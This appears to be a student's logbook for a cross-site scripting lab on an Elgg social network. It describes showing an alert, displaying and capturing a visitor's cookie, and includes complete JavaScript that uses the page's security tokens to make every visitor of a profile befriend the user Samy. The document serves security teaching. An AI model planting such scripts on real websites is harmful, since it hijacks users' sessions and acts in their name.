## Task 1

We did what was suggested and got an alert when accessing the user's profile.

[Logbook 10 - Task 1.1](/screenshots/logbook10-task1-1.png)

[Logbook 10 - Task 1.2](/screenshots/logbook10-task1-2.png)

## Task 2

We repeated the procedure of task 1, but now we replaced the alert's content with the user's cookie.

[Logbook 10 - Task 2.1](/screenshots/logbook10-task2-1.png)

[Logbook 10 - Task 2.2](/screenshots/logbook10-task2-2.png)

## Task 3

Once again we followed the instructions given: placed the script in the profile's description and opened a separate terminal to check if it worked. We got the cookie as expected.

[Logbook 10 - Task 3.1](/screenshots/logbook10-task3-1.png)

[Logbook 10 - Task 3.2](/screenshots/logbook10-task3-2.png)

## Task 4

First we used the firefox extension to inspect the request made to add a friend. We realized the request's url was /action/friends/add, and since it was a get request it was followed by the parameters we wanted to pass. In this case, what we assumed was the friends ID. We inspected Samy's user profile and realized his ID was 59, so we ended up with the following script:

```
window.onload = function(){
  var Ajax=null;
  var ts="&elgg_ts="+elgg.security.token.elgg_ts;
  var token="&elgg_token="+elgg.security.token.elgg_token;
  //Construct the HTTP request to add Samy as a friend.
  var sendurl="/action/friends/add?friend=59"+ts+token+ts+token;
  //Create and send Ajax request to add friend
  Ajax=new XMLHttpRequest();
  Ajax.open("GET", sendurl, true);
  Ajax.send();
}
```

With the script made, all that was left to do was place it in the user's profile. After accessing the user profile and checking the user's friend list we realized we were successful.

[Logbook 10 - Task 4.1](/screenshots/logbook10-task4-1.png)

[Logbook 10 - Task 4.2](/screenshots/logbook10-task4-2.png)

[Logbook 10 - Task 4.3](/screenshots/logbook10-task4-3.png)

